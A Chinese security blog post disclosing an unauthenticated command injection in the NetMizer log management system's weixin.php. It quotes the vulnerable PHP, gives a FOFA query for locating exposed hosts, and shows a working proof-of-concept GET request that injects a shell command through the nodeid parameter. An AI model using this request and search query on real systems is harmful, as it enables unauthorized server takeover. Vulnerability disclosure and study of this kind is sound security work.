---
title: "NetMizer日志管理系统 weixin.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-weixin-nodeid-rce.html
asset_dir: assets/netmizer日志管理系统-weixin.php-命令执行漏洞
---

# NetMizer日志管理系统 weixin.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/21 08:23
* 918浏览
* [0评论](#comment)
* 19分钟阅读

深入探索

网页服务器

身份验证

应用程序


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/weixin.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

移动与无线

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

深入探索

SQL

Docker加速服务

数据库

看下 `weixin.php` 业务实现关键逻辑部分

```
?php
    include('../include/JSON.php');

    $cmd = "/var/www/cgi-bin/search_wx";

    $sqltable = "tbl_weixin_log";

    list($year,$month,$day,$hour,$min,$second)=split(":| |-", $starttime);
    $start_time = mktime($hour, $min, $second, $month,$day,$year);
    $cmd .= " -s $start_time";
    list($year,$month,$day,$hour,$min,$second)=split(":| |-", $stoptime);
    $stop_time  = mktime($hour, $min, $second, $month,$day,$year);
    $cmd .= " -e $stop_time";

    if($nodeid != ""){
       $sql_nodeid = " and nodeid = ".ip2long($nodeid)." ";
       $cmd .= " -n $nodeid";
    } else $sql_nodeid = "";

    $srcip = $src;
    if($srcip == ""){
       $srcid = "-1";
    } else $srcid = ip2long($srcip); 
    if($srcid != "-1"){
       $sql_srcid = " and src_addr = $srcid ";
       $cmd .= " -S $srcid";
    } else {
       $sql_srcid = "";
    }

    $user = $username;
    if($user != ""){
       $sql_user = " and user_name = \"$user\" ";
       $cmd .= " -u $user";
    } else {
       $sql_user = "";
    }

    if($uid != ""){
       $sql_uid = " and wx_uid = $uid ";
       $cmd .= " -q $uid";
    } else {
       $sql_uid = "";
    }

    if(!isset($start)) $start = 0;
    if(!isset($limit)) $limit = 200;
    $cmd .= " -f $start -t 100000";

    if($action == 'file'){
       //echo $cmd."\n";
       $fp = @popen($cmd,"r");
       if(!$fp){
          echo '{"success":true,"info":"no data"}';
          return;
       }
```

多个用户可控且无过滤和校验的参数如 nodeid、username、uid 直接拼接进cmd命令中，然后使用popen执行命令，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

漏洞修复方案

```
GET /data/search/weixin.php?action=file&nodeid=;sleep+3+%23+ HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 延时 3 秒

[![NetMizer日志管理系统 weixin.php 命令执行漏洞](images/img-001-ce30300a89ee.webp)](https://image.mrxn.net/d870b4b1ea4e4d16823eb782280d5acc.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[NetMizer日志管理系统 weixin.php 命令执行漏洞](https://mrxn.net/jswz/netmizer-search-weixin-nodeid-rce.html)  
文章链接：<https://mrxn.net/jswz/netmizer-search-weixin-nodeid-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

网络安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-weixin-nodeid-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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